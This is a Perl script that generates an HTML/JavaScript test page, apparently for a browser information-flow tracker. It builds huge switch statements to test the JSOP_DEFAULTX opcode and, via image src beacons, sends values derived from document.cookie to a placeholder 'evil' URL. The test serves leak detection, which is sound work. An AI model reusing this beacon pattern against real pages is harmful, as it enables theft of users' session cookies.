#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_DEFAULTX";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    

		// shouldn't be evil 
		var notevil = 1;
		switch(true) {
			case (notevil == 3):
				notevil = 2;
				break;|;
for ($i = 2; $i < 2600; $i++) {
print qq|
		    case (notevil == $i) :
			    notevil = $i;
			    break;|;
}
print qq|
			default:
				notevil = 3;
		}		
		var url = "$imgevilurl?normal=" + notevil;
		document.images[0].src = url;

		
		// if with evil val 
		var notevil2 = 1;
		if ($evil) {
			switch(true) {
				case (notevil2 == 3):
					notevil3 = 2;
					break;|;
for ($i = 2; $i < 2600; $i++) {
print qq|
		        case (notevil2 == $i) :
			        notevil = $i;
			        break;|;
}
print qq|
				default:
					notevil2 = 3;
			}
		}
		var url2 = "$imgevilurl?if=" + notevil2;
		document.images[1].src = url2;
		
		var evil = 2;
		// normal usage 
		if ($evil) {
			evil = 1;
		}
		var notevil3 = 1;
		switch(true) {
			case (notevil3 == 3):
				notevil3 = 2;
				break;|;
for ($i = 2; $i < 2600; $i++) {
print qq|
		    case (notevil3 == $i) :
			    notevil = $i;
			    break;|;
}
print qq|
			default:
				notevil3 = evil;
		}
		var url3 = "$imgevilurl?isevil=" + notevil3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";


